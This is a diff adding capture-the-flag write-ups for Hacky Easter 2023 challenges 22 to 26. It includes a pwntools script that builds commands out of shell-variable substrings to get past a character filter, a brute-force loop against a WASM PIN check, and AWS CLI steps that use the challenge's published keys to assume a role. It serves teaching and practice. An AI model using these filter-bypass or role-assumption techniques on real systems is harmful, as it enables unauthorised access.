@@ -1,0 +1,388 @@
+= [HE23.22] Crash Bash
+
+image::level6/challenge22.jpg[,300,float="right"]
+
+== Intro
+Can you crash the bash?
+
+The password is `B4sh_br0TH3rs`
+
+Connect using `nc ch.hackyeaster.com 2303`
+
+Note: The service is restarted every hour at x:00.
+
+=== Hint
+  Some characters are forbidden, in the whole string you enter.
+
+== Solution
+Logging into the app, we are presented with a bash prompt:
+
+	_ nc ch.hackyeaster.com 2303
+	Welcome to Crash Bash!
+	To get the flag, call /printflag.sh with the password!
+	Enter "q" to quit.
+	----------------------
+	crashbash$
+
+Playing around a bit, we find that inputs are rejected if lower case caracters are entered, but upper case and `$`, `{`, `}` are allowed.  So we have to bypass the character filters.
+
+After some thought, we see that we can use some special variables to create lower case characters:
+
+	crashbash$ ${PWD}
+	/bin/bash: line 1: /tmp/opskmwiyffljiklvblrmkkezwcgzwmnn: Is a directory
+	crashbash$
+
+So by using the variables `$PWD` and `$TERM`, we can get -- with some luck --
+to execute `set` and get the whole environment which in turn will allow us to
+execute `/printflag.sh B4sh_br0TH3rs`.  Since I am prone mistyping, write a
+short script to get the flag (shamelessly stolen from the pwnlib template):
+
+[source,python]
+----
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+host = args.HOST or 'ch.hackyeaster.com'
+port = int(args.PORT or 2303)
+
+def start(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    return io
+
+
+def chars_at(var, pos, l=1):
+    return f'${{{var}:{pos}:{l}}}'
+
+
+def get_var(var):
+    print(io.recvuntil(b'crashbash$ '))
+    s = f'${{{var}}}'
+    io.sendline(s.encode('ascii'))
+    ret = io.recvuntil(b'\n')
+    ret = ret.decode('ascii').split(': ')[2]
+    log.info(ret)
+    return ret
+
+
+def get_char(chars, c):
+    if c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ':
+        return c
+    for k,v in chars.items():
+        if c in v:
+            for j in range(len(v)):
+                if v[j] == c:
+                    return chars_at(k,j,1)
+    log.error(f'character {c} not found in {chars}')
+    return ''
+
+def build_command(chars, target):
+    return ''.join(get_char(chars, c) for c in target)
+
+# we can only enter uppercase letters as commands, so 
+# get some characters via SHELL variables.
+
+io = start()
+
+chars = {var: get_var(var) for var in ['PWD', 'TERM']}
+log.info(f'{chars}')
+
+# now try to run set
+s = build_command(chars, 'set')
+print(io.recvuntil(b'crashbash$ '))
+log.info(s)
+io.sendline(s.encode('ascii'))
+ret = io.recvuntil(b'crashbash$ ').decode('ascii')
+log.info(f'{ret}')
+chars2 = {}
+for l in ret.split('\n'):
+    v = l.split('=')
+    if v[0] == 'BASH_VERSION': # is surrounded by '
+        chars2[v[0]] = v[1][1:-1]
+    elif len(v) == 2: 
+        chars2[v[0]] = v[1]
+
+log.info(f'{chars2}')
+
+flag = build_command(chars2, '/printflag.sh B4sh_br0TH3rs')
+log.info(flag)
+io.sendline(flag.encode('ascii'))
+io.interactive()
+----
+
+Since `$PWD` changes from run to run, we might have to try multiple times
+before `set` can be executed, but if successful, we get the flag:
+
+    [*] Switching to interactive mode
+    Congrats, here's your flag:
+    he2023{gr34t_b4sh_succ3ss!}
+
+
+= [HE23.23] Code Locked
+
+image::level6/challenge23.jpg[,300,float="right"]
+
+== Intro
+Open the code lock at http://ch.hackyeaster.com:2311 to get your 🚩 flag.
+
+== Solution
+We are presented with a number pad to enter an 8-digit code.  The code is verified using a function implemented as wasm.  If the code is correct, we get the flag.  The important code from ``main.js`` is:
+
+[source,javascript]
+----
+function checkWASM(code) {
+    const pinArray = new Int32Array(wasmMemory.buffer, 0, 26);
+    encode(code, pinArray);
+    wasmCheck(pinArray.byteOffset, pinArray.length);
+    return decode(pinArray);
+}
+
+function play(file) {
+    a = new Audio(file);    
+    a.play();
+}
+
+function press(input) {
+    if (input == "*") {
+        play("delete.mp3");
+        $("#yellow").show(0).delay(200).hide(0);
+        code = "";
+    } else if (input == "#") {
+        msg = checkWASM(code);
+        if (msg.startsWith("he2023")) {
+            play("success.mp3");
+            audio]bSuccess.play();
+            $("#green").show(0).delay(5000).hide(0);
+        } else {
+            play("fail.mp3");
+            $("#red").show(0).delay(1000).hide(0);
+        }
+        setTimeout(function() {alert(msg);}, 200)
+    } else {
+        $("#yellow").show(0).delay(200).hide(0);
+        play("click.wav");
+        code = (code + input).substr(-8, 8);
+    }
+}
+----
+
+``code`` is a string representing the eight digits needed, so we can try all possibilities:
+
+[source,javascript]
+----
+for(tmp=0 ; tmp<=99999999; tmp++) {
+  code = ("00000000"+tmp).slice(-8);
+  msg = checkWASM(code);
+  if (msg.startsWith("he2023")) {
+    console.log(code);
+    console.log(msg);  
+    break;
+  }
+  if(tmp % 100000 == 0) {
+    console.log(code);
+  }
+}
+----
+
+This prints the PIN 29660145 and the flag ``he2023{w3b4553m81y_15_FUN}``.
+
+image::level6/wasm_fun.png[,300,]
+
+= [HE23.24] Quilt
+
+image::level6/challenge24.jpg[,300,float="right"]
+
+== Intro
+A warm, sunny day - perfect weather for a picnic! But what's that - did the bunnies really bring the nice quilt from the living room as a blanket?
+
+image::level6/quilt.png[,300,float="right"]
+
+=== Hint
+Cut a beautiful quilt like this into pieces? A shame, but maybe necessary!
+
+== Solution
+The quilt has to be cut into single QR-codes, decoded and then made sense of.
+It turns out that each code contains only a single character.  When analysed
+in the right order and printed as a text, we get
+
+  Hello! Do you love quilts? Well... I am pretty sure I do! They are so
+  pretty.. my oh my, but look at me getting lost in idle thoughts! You are
+  here for an egg, right? I bet you are. Where did I put it? Ah, here
+  he2023{this_is_th... No, sorry, that is not it. That was an old one, can
+  you believe it? This maybe? he2023{I_need_this_egg_for_breakfast}. Nooo..
+  sorry! But I am fairly sure this is it, right here
+  he2023{Qu1lt1ng_is_quit3_relaxing!} Yeah, that should be it. Sorry. I am
+  rambling, but it is so nice to have a visitor appreciating my quilts! They
+  are a lot of work, and I love all of them. Please, do not leave so soon.
+  How about a cookie? Would you like a cookie? Hey, where are you going?
+
+The program uses PIL and pyzbar
+
+[source,python]
+----
+import itertools
+from PIL import Image
+from pyzbar.pyzbar import decode
+
+
+def getTiles():
+    imgs = []
+    with Image.open('quilt.png') as img:
+        x, y = img.size 
+        h = 69
+        for iy, ix in itertools.product(range(0, y, h), range(0, x, h)):
+            cropped = img.crop((ix,iy,ix+h, iy+h))
+            imgs.append(cropped)
+    return imgs
+
+
+if __name__ == '__main__':
+    imgs = getTiles()
+    for img in imgs:
+        # data = decode(Image.fromarray(img))
+        data = decode(img)
+        if len(data) > 0:
+            foundText = data[0].data.decode()
+            print(f'{foundText}', end='')
+----
+
+
+= [HE23.25] Cats in the Bucket
+
+image::level6/challenge25.jpg[,300,float="right"]
+
+== Intro
+There is a bucket full of cat images. One of them contains a flag. Go get it!
+
+* Bucket: ``cats-in-a-bucket``
+* Access Key ID: ``AKIATZ2X44NMCEQW46PL``
+* Secret Access Key: ``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``
+
+=== Hints
+What exactly does the bucket allow?
+
+== Solution
+
+  _ aws --profile he2023 configure
+  AWS Access Key ID [None]: AKIATZ2X44NMCEQW46PL
+  AWS Secret Access Key [None]: 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
+  Default region name [None]:
+  Default output format [None]:
+
+Now we can list the bucket and see that there are four files, but the last file ``cat4.jpg`` cannot be downloaded.  Listing the bucket policiy, we see that this file can only be downloaded using a special role:
+
+
+  _ aws s3 ls s3://cats-in-a-bucket/  --profile he2023
+  2022-10-09 17:23:46      83709 cat1.jpg
+  2022-10-09 17:23:48      92350 cat2.jpg
+  2022-10-09 17:23:47     119214 cat3.jpg
+  2022-10-09 17:23:47      87112 cat4.jpg
+  
+  _ aws s3 ls s3://cats-in-a-bucket/cat4.jpg cat4.jpg  --profile he2023
+  
+  Unknown options: cat4.jpg
+  
+  _ aws s3 cp s3://cats-in-a-bucket/cat4.jpg cat4.jpg  --profile he2023
+  fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
+  _ aws s3api get-bucket-policy --bucket cats-in-a-bucket  --profile he2023 --query Policy --output text >policy.json
+
+[source, json]
+----
+{
+  "Version":"2008-10-17",
+  "Statement":[
+    {
+      "Effect":"Allow",
+      "Principal":{"AWS":"arn:aws:iam::261640479576:user/misterbuttons"},
+      "Action":["s3:ListBucket","s3:GetBucketPolicy"],
+      "Resource":"arn:aws:s3:::cats-in-a-bucket"},
+    {
+      "Effect":"Allow",
+      "Principal":{"AWS":"arn:aws:iam::261640479576:user/misterbuttons"},
+      "Action":"s3:GetObject",
+      "Resource":[
+    				"arn:aws:s3:::cats-in-a-bucket/cat1.jpg",
+    				"arn:aws:s3:::cats-in-a-bucket/cat2.jpg",
+    				"arn:aws:s3:::cats-in-a-bucket/cat3.jpg"]},
+    {
+      "Effect":"Allow",
+      "Principal":{"AWS":"arn:aws:iam::261640479576:role/captainclaw"},
+      "Action":"s3:ListBucket",
+      "Resource":"arn:aws:s3:::cats-in-a-bucket"},
+    {
+      "Effect":"Allow",
+      "Principal":{"AWS":"arn:aws:iam::261640479576:role/captainclaw"},
+      "Action":"s3:GetObject",
+      "Resource":"arn:aws:s3:::cats-in-a-bucket/cat4.jpg"}
+  ]
+}
+----
+
+So we have to assumt the role of captainclaw to get at the last file.  Add a few lines to ``~/.aws/credentials`` and Bob's your uncle:
+
+  [he2023a]
+  role_arn = arn:aws:iam::261640479576:role/captainclaw
+  source_profile = he2023
+
+  _ aws --profile he2023a sts get-caller-identity
+  {
+      "UserId": "AROATZ2X44NMIIMXFXIG7:botocore-session-1680938233",
+      "Account": "261640479576",
+      "Arn": "arn:aws:sts::261640479576:assumed-role/captainclaw/botocore-session-1680938233"
+  }
+  
+  
+  _ aws s3 cp s3://cats-in-a-bucket/cat4.jpg  cat4.jpg --profile he2023a
+  download: s3://cats-in-a-bucket/cat4.jpg to .\cat4.jpg
+
+image::level6/cat4.jpg[,300,]
+
+``he2023{r0l3_assum3d_succ3ssfuLLy}```
+
+= [HE23.26] Tom's Diary
+
+image::level6/challenge26.jpg[,300,float="right"]
+
+== Intro
+Tom found a flag and wrote something about it in his diary.
+
+Can you get the flag?
+
+
+  // // // // // // // // // // // // // // // // // // // // // //
+  // // // // // // // // // // // // // // // // // // // // // //
+  
+  Tom's Diary
+  
+  \/\ \\\/ / \/\ /\\ /\ \/\ //\ /\/ /\// //\/ /\// /\/ //\ /\\\ \\/\
+  \/\ \\\/ / \/\ /\\ /\ \/\ //\ /\/ /\// //\/ /\// /\/ //\ /\\\ \\/\
+  
+  Dear diary,
+  
+  today I found a secret flag.
+  
+  I need to keep it safe here:
+  
+  UEsDBAoACQAAAJJEK1X6oNHsKgAAAB4AAAAIABwAZmxhZy50eHRVVAkAA/OBHWOR
+  gR1jdXgLAAEE9QEAAAQUAAAArGnVXoZRCLYaWU8HFSFo+dWfh2yfPa868sNqxTVP
+  xqHrGTs3dIVbxR9WUEsHCPqg0ewqAAAAHgAAAFBLAQIeAwoACQAAAJJEK1X6oNHs
+  KgAAAB4AAAAIABgAAAAAAAEAAACkgQAAAABmbGFnLnR4dFVUBQAD84EdY3V4CwAB
+  BPUBAAAEFAAAAFBLBQYAAAAAAQABAE4AAAB8AAAAAAA=
+  
+  \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\
+  \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\
+
+=== Hint
+Neither brute force nor word lists are necessary.
+
+== Solution
+The "safe" is a base64 encoded zip file that can be turned into ``safe.zip`` using Cyber Chef (From Base64 --> Extract Files).  Of ocurse the file is password protected and the password is probably coded in the diary.
+
+  \/\ \\\/ / \/\ /\\ /\ \/\ //\ /\/ /\// //\/ /\// /\/ //\ /\\\ \\/\
+
+This looks suspicious and is "Tom Tom Code" that
+https://www.dcode.fr/tom-tom-code happily decodes into ``slashesforprofit``.
+
+Using unzip we get the flag ``he2023{sl4sh3s_m4k3_m3_h4ppy}``
+slashesforprofit
